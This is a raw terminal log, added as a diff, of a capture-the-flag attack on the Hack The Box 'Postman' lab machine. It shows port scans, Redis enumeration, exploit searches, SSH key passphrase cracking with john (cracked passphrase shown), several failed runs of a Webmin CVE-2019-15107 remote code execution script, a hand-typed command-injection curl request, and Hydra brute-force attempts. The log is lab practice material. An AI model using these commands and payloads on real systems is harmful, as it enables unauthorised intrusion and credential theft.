@@ -1,0 +1,483 @@
+root@parrot:~/hackthebox/postman# less nmap/postman.nmap                                           
+root@parrot:~/hackthebox/postman# ping 10.10.10.160                                                
+PING 10.10.10.160 (10.10.10.160) 56(84) bytes of data.                                             
+64 bytes from 10.10.10.160: icmp_seq=1 ttl=63 time=227 ms                                          
+64 bytes from 10.10.10.160: icmp_seq=2 ttl=63 time=226 ms                                          
+^C                      
+--- 10.10.10.160 ping statistics ---             
+2 packets transmitted, 2 received, 0% packet loss, time 1000ms                                     
+root@parrot:~/hackthebox/postman# gobuster dir -u 10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                     
+===============================================================                  
+Gobuster v3.0.1                         
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                  
+===============================================================                  
+[+] Url:            http://10.10.10.160 
+[+] Threads:        10                  
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+[+] Status codes:   200,204,301,302,307,401,403                                  
+[+] User Agent:     gobuster/3.0.1      
+[+] Timeout:        10s                 
+===============================================================                  
+2020/01/12 23:51:32 Starting gobuster   
+===============================================================                  
+/images (Status: 301)                   
+/upload (Status: 301)                   
+/css (Status: 301)                      
+/js (Status: 301)                       
+/fonts (Status: 301)                    
+Progress: 78037 / 220561 (35.38%)^C     
+[!] Keyboard interrupt detected, terminating.                                    
+===============================================================                  
+2020/01/13 00:18:42 Finished            
+===============================================================                  
+root@parrot:~/hackthebox/postman# nmap -sC -vvv -p- 10.10.10                     
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 00:19 EST                  
+
+root@parrot:~/hackthebox/postman# nmap -sC -vvv -p- 10.10.10.160                 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 00:19 EST                  
+NSE: Loaded 121 scripts for scanning.   
+NSE: Script Pre-scanning.               
+NSE: Starting runlevel 1 (of 2) scan.   
+Initiating NSE at 00:19                 
+Completed NSE at 00:19, 0.00s elapsed   
+NSE: Starting runlevel 2 (of 2) scan.   
+Initiating NSE at 00:19                 
+Completed NSE at 00:19, 0.00s elapsed   
+Initiating Ping Scan at 00:19           
+Scanning 10.10.10.160 [4 ports]         
+Completed Ping Scan at 00:19, 0.60s elapsed (1 total hosts)                      
+Initiating SYN Stealth Scan at 00:19    
+Scanning postman.htb (10.10.10.160) [65535 ports]                                
+Discovered open port 22/tcp on 10.10.10.160                                      
+Discovered open port 80/tcp on 10.10.10.160                                      
+Increasing send delay for 10.10.10.160 from 0 to 5 due to 345 out of 1148 dropped probes since last increase.                                                      
+SYN Stealth Scan Timing: About 3.61% done; ETC: 00:33 (0:13:48 remaining)        
+SYN Stealth Scan Timing: About 4.72% done; ETC: 00:40 (0:20:30 remaining)        
+SYN Stealth Scan Timing: About 8.12% done; ETC: 00:40 (0:19:25 remaining)        
+SYN Stealth Scan Timing: About 11.56% done; ETC: 00:38 (0:16:57 remaining)       
+SYN Stealth Scan Timing: About 15.17% done; ETC: 00:37 (0:15:12 remaining)       
+SYN Stealth Scan Timing: About 23.20% done; ETC: 00:36 (0:13:18 remaining)       
+SYN Stealth Scan Timing: About 24.65% done; ETC: 00:38 (0:14:16 remaining)       
+SYN Stealth Scan Timing: About 25.31% done; ETC: 00:39 (0:15:15 remaining)       
+SYN Stealth Scan Timing: About 25.96% done; ETC: 00:41 (0:16:18 remaining)       
+
+root@parrot:~/hackthebox/postman# nmap -vvv -p- 10.10.10.160                                                                                                       
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 00:25 EST                  
+Initiating Ping Scan at 00:25           
+Scanning 10.10.10.160 [4 ports]         
+Completed Ping Scan at 00:25, 0.58s elapsed (1 total hosts)                      
+Initiating SYN Stealth Scan at 00:25    
+Scanning postman.htb (10.10.10.160) [65535 ports]                                
+Discovered open port 80/tcp on 10.10.10.160                                      
+Discovered open port 22/tcp on 10.10.10.160                                      
+Increasing send delay for 10.10.10.160 from 0 to 5 due to 388 out of 1291 dropped probes since last increase.                                                      
+SYN Stealth Scan Timing: About 7.48% done; ETC: 00:32 (0:06:23 remaining)        
+SYN Stealth Scan Timing: About 9.52% done; ETC: 00:36 (0:09:40 remaining)        
+SYN Stealth Scan Timing: About 11.14% done; ETC: 00:39 (0:12:06 remaining)       
+SYN Stealth Scan Timing: About 12.84% done; ETC: 00:41 (0:13:42 remaining)       
+SYN Stealth Scan Timing: About 14.01% done; ETC: 00:43 (0:15:27 remaining)       
+SYN Stealth Scan Timing: About 15.11% done; ETC: 00:45 (0:16:57 remaining)       
+SYN Stealth Scan Timing: About 16.15% done; ETC: 00:47 (0:18:16 remaining)       
+SYN Stealth Scan Timing: About 17.69% done; ETC: 00:49 (0:19:23 remaining)       
+SYN Stealth Scan Timing: About 23.02% done; ETC: 00:49 (0:18:07 remaining)       
+SYN Stealth Scan Timing: About 26.87% done; ETC: 00:47 (0:16:06 remaining)       
+SYN Stealth Scan Timing: About 30.57% done; ETC: 00:46 (0:14:34 remaining)       
+SYN Stealth Scan Timing: About 33.90% done; ETC: 00:46 (0:13:29 remaining)       
+SYN Stealth Scan Timing: About 37.47% done; ETC: 00:45 (0:12:23 remaining)       
+SYN Stealth Scan Timing: About 41.02% done; ETC: 00:45 (0:11:23 remaining)       
+SYN Stealth Scan Timing: About 49.56% done; ETC: 00:42 (0:08:34 remaining)       
+Increasing send delay for 10.10.10.160 from 5 to 10 due to 10588 out of 35292 dropped probes since last increase.                                                  
+Increasing send delay for 10.10.10.160 from 10 to 20 due to max_successful_tryno increase to 4                                                                     
+SYN Stealth Scan Timing: About 62.07% done; ETC: 00:51 (0:09:38 remaining)       
+Discovered open port 6379/tcp on 10.10.10.160                                    
+SYN Stealth Scan Timing: About 71.45% done; ETC: 00:55 (0:08:22 remaining)       
+Increasing send delay for 10.10.10.160 from 20 to 40 due to max_successful_tryno increase to 5                                                                     
+SYN Stealth Scan Timing: About 73.03% done; ETC: 01:02 (0:09:51 remaining)       
+SYN Stealth Scan Timing: About 73.06% done; ETC: 01:09 (0:11:42 remaining)       
+
+root@parrot:~/hackthebox/postman# nmap -sC -sV -p6379 10.10.10.160               
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 04:36 EST                  
+Nmap scan report for postman.htb (10.10.10.160)                                  
+Host is up (0.18s latency).             
+
+PORT     STATE SERVICE VERSION          
+6379/tcp open  redis   Redis key-value store 4.0.9                               
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                     
+Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds                      
+root@parrot:~/hackthebox/postman# nmap --script redis-info -sV -p 6379 10.10.10.160                                                                                
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 04:37 EST                  
+Nmap scan report for postman.htb (10.10.10.160)                                  
+Host is up (0.19s latency).             
+
+PORT     STATE SERVICE VERSION          
+6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)                     
+| redis-info:                           
+|   Version: 4.0.9                      
+|   Operating System: Linux 4.15.0-58-generic x86_64                             
+|   Architecture: 64 bits               
+|   Process ID: 598                     
+|   Used CPU (sys): 61.24               
+|   Used CPU (user): 19.42              
+|   Connected clients: 1                
+|   Connected slaves: 0                 
+|   Used memory: 820.63K                
+|   Role: master                        
+|   Bind addresses:                     
+|     0.0.0.0                           
+|     ::1                               
+|   Client connections:                 
+|_    10.10.14.14                       
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                     
+Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds                      
+root@parrot:~/hackthebox/postman# nmap --script redis-info -sV -p 6379 -oA nmap/redis 10.10.10.160                                                                 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-13 04:38 EST                  
+Nmap scan report for postman.htb (10.10.10.160)                                  
+Host is up (0.59s latency).             
+
+PORT     STATE SERVICE VERSION          
+6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)                     
+| redis-info:                           
+|   Version: 4.0.9                      
+|   Operating System: Linux 4.15.0-58-generic x86_64                             
+|   Architecture: 64 bits               
+|   Process ID: 598                     
+|   Used CPU (sys): 61.30               
+|   Used CPU (user): 19.45              
+|   Connected clients: 1                
+|   Connected slaves: 0                 
+|   Used memory: 820.63K                
+|   Role: master                        
+|   Bind addresses:                     
+|     0.0.0.0                           
+|     ::1                               
+|   Client connections:                 
+|_    10.10.14.14                       
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                     
+Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds                     
+root@parrot:~/hackthebox/postman# searchsploit redis                             
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                            |  Path                                  
+                                                                                                                          | (/usr/share/exploitdb/)                
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)                                                             | exploits/linux/remote/47195.rb         
+Redis 5.0 - Denial of Service                                                                                             | exploits/linux/dos/44908.txt           
+Redis-cli < 5.0 - Buffer Overflow (PoC)                                                                                   | exploits/linux/local/44904.py          
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                   
+root@parrot:~/hackthebox/postman# ls    
+nmap  redis.py                          
+root@parrot:~/hackthebox/postman# searchsploit -x exploits/linux/remote/47195.rb 
+  Exploit: Redis 4.x / 5.x - Unauthenticated Code Execution (Metasploit)         
+      URL: https://www.exploit-db.com/exploits/47195                             
+     Path: /usr/share/exploitdb/exploits/linux/remote/47195.rb                   
+File Type: Ruby script, ASCII text, with CRLF line terminators                   
+
+
+
+root@parrot:~/hackthebox/postman# redis-cli                                      
+Could not connect to Redis at 127.0.0.1:6379: Connection refused                 
+not connected>                          
+root@parrot:~/hackthebox/postman# redis-cli -h 10.10.10.160                      
+10.10.10.160:6379> exit                 
+root@parrot:~/hackthebox/postman# mkdir www                                      
+root@parrot:~/hackthebox/postman# cd www/                                        
+root@parrot:~/hackthebox/postman/www# cp /opt/linux_privsec/LinEnum.sh .         
+root@parrot:~/hackthebox/postman/www# ls
+LinEnum.sh                              
+root@parrot:~/hackthebox/postman/www# python -m SimpleHTTPServer                 
+Serving HTTP on 0.0.0.0 port 8000 ...   
+10.10.10.160 - - [13/Jan/2020 05:39:16] "GET /LinEnum.sh HTTP/1.1" 200 -         
+^CTraceback (most recent call last):    
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main           
+    "__main__", fname, loader, pkg_name)                                         
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code                      
+    exec code in run_globals            
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module>           
+    test()                              
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test               
+    BaseHTTPServer.test(HandlerClass, ServerClass)                               
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test                 
+    httpd.serve_forever()               
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever          
+    poll_interval)                      
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry           
+    return func(*args)                  
+KeyboardInterrupt                       
+root@parrot:~/hackthebox/postman/www# vi /opt/ssh2john.py                        
+root@parrot:~/hackthebox/postman/www# vi matt.john                               
+root@parrot:~/hackthebox/postman/www# ls
+LinEnum.sh  matt.john                   
+root@parrot:~/hackthebox/postman/www# mv matt.john ../                           
+root@parrot:~/hackthebox/postman/www# ls
+LinEnum.sh                              
+root@parrot:~/hackthebox/postman/www# cd ..                                      
+root@parrot:~/hackthebox/postman# ls    
+foo.txt  matt  matt.john  nmap  redis.py  ssh  ssh.pub  www                      
+root@parrot:~/hackthebox/postman# vi matt.john                                   
+root@parrot:~/hackthebox/postman# john matt.john --wordlist=/opt/wordlists/rockyou.txt                                                                             
+Using default input encoding: UTF-8     
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])       
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes                                                                                 
+Cost 2 (iteration count) is 2 for all loaded hashes                              
+Will run 3 OpenMP threads               
+Note: This format may emit false positives, so it will keep trying even after    
+finding a possible candidate.           
+Press 'q' or Ctrl-C to abort, almost any other key for status                    
+computer2008     (/root/hackthebox/postman/matt)                                 
+1g 0:00:01:17 DONE (2020-01-13 06:00) 0.01292g/s 185341p/s 185341c/s 185341C/s     1111..*7¡Vamos!                                                                 
+Session completed                       
+root@parrot:~/hackthebox/postman# searchsploit webmin                            
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                            |  Path                                  
+                                                                                                                          | (/usr/share/exploitdb/)                
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                           | exploits/cgi/webapps/23535.txt         
+Webmin - Brute Force / Command Execution                                                                                  | exploits/multiple/remote/705.pl        
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                               | exploits/linux/remote/22275.pl         
+Webmin 0.x - 'RPC' Privilege Escalation                                                                                   | exploits/linux/remote/21765.pl         
+Webmin 0.x - Code Input Validation                                                                                        | exploits/linux/local/21348.txt         
+Webmin 1.5 - Brute Force / Command Execution                                                                              | exploits/multiple/remote/746.pl        
+Webmin 1.5 - Web Brute Force (CGI)                                                                                        | exploits/multiple/remote/745.pl        
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                     | exploits/unix/remote/21851.rb          
+Webmin 1.850 - Multiple Vulnerabilities                                                                                   | exploits/cgi/webapps/42989.txt         
+Webmin 1.900 - Remote Command Execution (Metasploit)                                                                      | exploits/cgi/remote/46201.rb           
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                    | exploits/linux/remote/46984.rb         
+Webmin 1.920 - Remote Code Execution                                                                                      | exploits/linux/webapps/47293.sh        
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                         | exploits/linux/remote/47230.rb         
+Webmin 1.x - HTML Email Command Execution                                                                                 | exploits/cgi/webapps/24574.txt         
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                        | exploits/multiple/remote/1997.php      
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                       | exploits/multiple/remote/2017.pl       
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                          | exploits/php/webapps/2462.txt          
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                      | exploits/php/webapps/2451.txt          
+webmin 0.91 - Directory Traversal                                                                                         | exploits/cgi/remote/21183.txt          
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                   
+root@parrot:~/hackthebox/postman# find --help                                    
+Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]       
+
+default path is the current directory; default expression is -print              
+expression may consist of: operators, options, tests, and actions:               
+operators (decreasing precedence; -and is implicit where no others are given):   
+      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2          
+      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2                           
+positional options (always true): -daystart -follow -regextype                   
+
+normal options (always true, specified before other expressions):                
+      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf             
+      --version -xdev -ignore_readdir_race -noignore_readdir_race                
+tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N            
+      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME        
+      -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN 
+      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE         
+      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN               
+      -readable -writable -executable   
+      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N           
+      -used N -user NAME -xtype [bcdpfls]      -context CONTEXT                  
+
+actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print              
+      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit                      
+      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;                           
+      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;                  
+
+Valid arguments for -D:                 
+exec, opt, rates, search, stat, time, tree, all, help                            
+Use '-D help' for a description of the options, or see find(1)                   
+
+Please see also the documentation at http://www.gnu.org/software/findutils/.     
+You can report (and track progress on fixing) bugs in the "find"                 
+program via the GNU findutils bug-reporting page at                              
+https://savannah.gnu.org/bugs/?group=findutils or, if                            
+you have no web access, by sending email to <bug-findutils@gnu.org>.             
+root@parrot:~/hackthebox/postman# searchsploit -x exploits/linux/webapps/47293.sh
+  Exploit: Webmin 1.920 - Remote Code Execution                                  
+      URL: https://www.exploit-db.com/exploits/47293                             
+     Path: /usr/share/exploitdb/exploits/linux/webapps/47293.sh                  
+File Type: POSIX shell script, ASCII text executable, with CRLF line terminators 
+
+
+
+root@parrot:~/hackthebox/postman# searchsploit -m exploits/linux/webapps/47293.sh                                                                                  
+  Exploit: Webmin 1.920 - Remote Code Execution                                  
+      URL: https://www.exploit-db.com/exploits/47293                             
+     Path: /usr/share/exploitdb/exploits/linux/webapps/47293.sh                  
+File Type: POSIX shell script, ASCII text executable, with CRLF line terminators 
+
+Copied to: /root/hackthebox/postman/47293.sh                                     
+
+
+root@parrot:~/hackthebox/postman# ls    
+47293.sh  foo.txt  matt  matt.john  nmap  redis.py  ssh  ssh.pub  www            
+root@parrot:~/hackthebox/postman# ./47293.sh https://postman.htb:10000           
+-bash: ./47293.sh: /bin/sh^M: bad interpreter: No such file or directory         
+root@parrot:~/hackthebox/postman# chmod +x 47293.sh                              
+root@parrot:~/hackthebox/postman# ./47293.sh https://postman.htb:10000           
+-bash: ./47293.sh: /bin/sh^M: bad interpreter: No such file or directory         
+root@parrot:~/hackthebox/postman# vim 47293.sh                                   
+root@parrot:~/hackthebox/postman# ./47293.sh                                     
+-bash: ./47293.sh: /bin/sh^M: bad interpreter: No such file or directory         
+root@parrot:~/hackthebox/postman# vim 47293.sh                                   
+root@parrot:~/hackthebox/postman# bash 47293.sh                                  
+47293.sh: line 2: $'\r': command not found                                       
+47293.sh: line 4: $'\r': command not found                                       
+47293.sh: line 5: $'\r': command not found                                       
+Testing for RCE (CVE-2019-15107) on https://postman.htb:10000: 47293.sh: line 6: $'\r': command not found                                                          
+: ambiguous redirect                    
+47293.sh: line 8: $'\r': command not found                                       
+47293.sh: line 16: syntax error: unexpected end of file                          
+root@parrot:~/hackthebox/postman# vim 47293.sh                                                                                                                     
+root@parrot:~/hackthebox/postman# bash 47293.sh                                                                                                                    
+47293.sh: line 2: $'\r': command not found                                       
+47293.sh: line 4: $'\r': command not found                                       
+47293.sh: line 5: $'\r': command not found                                       
+Testing for RCE (CVE-2019-15107) on https://postman.htb:10000: 47293.sh: line 6: $'\r': command not found                                                          
+: ambiguous redirect                    
+47293.sh: line 8: $'\r': command not found                                       
+47293.sh: line 16: syntax error: unexpected end of file                          
+root@parrot:~/hackthebox/postman# vim 47293.sh                                                                                                                     
+root@parrot:~/hackthebox/postman# curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo 'f3a0c13c3765137bcde68572707ae5c0'&new1=wheel&new2=
+wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: 'https://postman.htb:10000'/sess
+ion_login.cgi'|grep $FLAG>/dev/null 2>&1                                                                                                                           
+root@parrot:~/hackthebox/postman# vim 47293.sh                                                                                                                     
+root@parrot:~/hackthebox/postman# bash 47293.sh                                  
+47293.sh: line 2: $'\r': command not found                                       
+47293.sh: line 4: $'\r': command not found                                       
+47293.sh: line 5: $'\r': command not found                                       
+Testing for RCE (CVE-2019-15107) on https://postman.htb:10000: 47293.sh: line 6: $'\r': command not found                                                          
+: ambiguous redirect                    
+47293.sh: line 8: $'\r': command not found                                       
+47293.sh: line 16: syntax error: unexpected end of file                          
+root@parrot:~/hackthebox/postman# searchsploit -x exploits/cgi/webapps/42989.txt 
+  Exploit: Webmin 1.850 - Multiple Vulnerabilities                               
+      URL: https://www.exploit-db.com/exploits/42989                             
+     Path: /usr/share/exploitdb/exploits/cgi/webapps/42989.txt                   
+File Type: HTML document, UTF-8 Unicode text, with CRLF line terminators         
+
+
+
+root@parrot:~/hackthebox/postman# hydra -l root -P /opt/wordlists/rockyou.txt https://postman.htb http-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed"                                 
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                    
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-13 07:40:45                                                                                 
+[ERROR] Invalid target definition!      
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!        
+root@parrot:~/hackthebox/postman# hydra -l root -P /opt/wordlists/rockyou.txt https://postman.htb:10000 http-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:
+Login failed"                                                                                                                                                      
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                    
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-13 07:41:10                                                                                 
+[ERROR] Invalid target definition!      
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!        
+root@parrot:~/hackthebox/postman# hydra -l root -P /opt/wordlists/rockyou.txt https://postman.htb:10000 http-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed"                           
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                    
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-13 07:41:14                                                                                 
+[ERROR] Invalid target definition!      
+[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!        
+root@parrot:~/hackthebox/postman# hydra -r  -l root -P /opt/wordlists/rockyou.txt https://postman.htb:10000 http-post-form "/session_login.cgi:user=^USER^&pass=^PA
+SS^:Login failed"                                                                                                                                                  
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                    
+
+hydra: invalid option -- 'r'            
+root@parrot:~/hackthebox/postman# hydra -h                                       
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.                                    
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]                
+
+Options:                                
+  -R        restore a previous aborted/crashed session                           
+  -I        ignore an existing restore file (don't wait 10 seconds)              
+  -S        perform an SSL connect      
+  -s PORT   if the service is on a different default port, define it here        
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE   
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE    
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help   
+  -y        disable use of symbols in bruteforce, see above                      
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login   
+  -u        loop around users, not passwords (effective! implied with -x)        
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options        
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port   
+  -o FILE   write found login/password pairs to FILE instead of stdout           
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1      
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)    
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)    
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)         
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)  
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)         
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)    
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode     
+  -O        use old SSL v2 and v3       
+  -q        do not print messages about connection errors                        
+  -U        service module usage details                                         
+  -h        more command line options (COMPLETE HELP)                            
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)        
+  service   the service to crack (see below for supported protocols)             
+  OPT       some service modules support additional input (-U for module help)   
+
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp                                           
+
+Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL   
+v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra                                                                         
+Don't use in military or secret service organizations, or for illegal purposes.  
+These services were not compiled in: afp ncp oracle sapr3.                       
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.     
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://) 
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)    
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080                      
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)                 
+
+Examples:                               
+  hydra -l user -P passlist.txt ftp://192.168.0.1                                
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN                    
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5              
+  hydra -l admin -p password ftp://[192.168.0.0/24]/                             
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh                              
+root@parrot:~/hackthebox/postman# searchsploit webmin                            
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                            |  Path                                  
+                                                                                                                          | (/usr/share/exploitdb/)                
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                           | exploits/cgi/webapps/23535.txt         
+Webmin - Brute Force / Command Execution                                                                                  | exploits/multiple/remote/705.pl        
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                               | exploits/linux/remote/22275.pl         
+Webmin 0.x - 'RPC' Privilege Escalation                                                                                   | exploits/linux/remote/21765.pl         
+Webmin 0.x - Code Input Validation                                                                                        | exploits/linux/local/21348.txt         
+Webmin 1.5 - Brute Force / Command Execution                                                                              | exploits/multiple/remote/746.pl        
+Webmin 1.5 - Web Brute Force (CGI)                                                                                        | exploits/multiple/remote/745.pl        
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                     | exploits/unix/remote/21851.rb          
+Webmin 1.850 - Multiple Vulnerabilities                                                                                   | exploits/cgi/webapps/42989.txt         
+Webmin 1.900 - Remote Command Execution (Metasploit)                                                                      | exploits/cgi/remote/46201.rb           
+Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                    | exploits/linux/remote/46984.rb         
+Webmin 1.920 - Remote Code Execution                                                                                      | exploits/linux/webapps/47293.sh        
+Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                         | exploits/linux/remote/47230.rb         
+Webmin 1.x - HTML Email Command Execution                                                                                 | exploits/cgi/webapps/24574.txt         
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                        | exploits/multiple/remote/1997.php      
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                       | exploits/multiple/remote/2017.pl       
+phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                          | exploits/php/webapps/2462.txt          
+phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                      | exploits/php/webapps/2451.txt          
+webmin 0.91 - Directory Traversal                                                                                         | exploits/cgi/remote/21183.txt          
+-------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result                   
+root@parrot:~/hackthebox/postman# ls    
+47293.sh  exploit.py  foo.txt  matt  matt.john  nmap  redis.py  ssh  ssh.pub  www
+root@parrot:~/hackthebox/postman# vim 47293.sh                                   
+root@parrot:~/hackthebox/postman# bahs 47293.sh                                  
+-bash: bahs: command not found          
+root@parrot:~/hackthebox/postman# bash 47293.sh                                  
+47293.sh: line 2: $'\r': command not found                                       
+47293.sh: line 5: $'\r': command not found                                       
+: ambiguous redirect-2019-15107) on https://postman.htb:10000                    
+47293.sh: line 8: $'\r': command not found                                       
+47293.sh: line 16: syntax error: unexpected end of file                          
+root@parrot:~/hackthebox/postman# searchsploit -x exploits/linux/remote/47230.rb 
+  Exploit: Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)     
+      URL: https://www.exploit-db.com/exploits/47230                             
+     Path: /usr/share/exploitdb/exploits/linux/remote/47230.rb                   
+File Type: Ruby script, UTF-8 Unicode text, with CRLF line terminators           
+
+
+
+root@parrot:~/hackthebox/postman#       
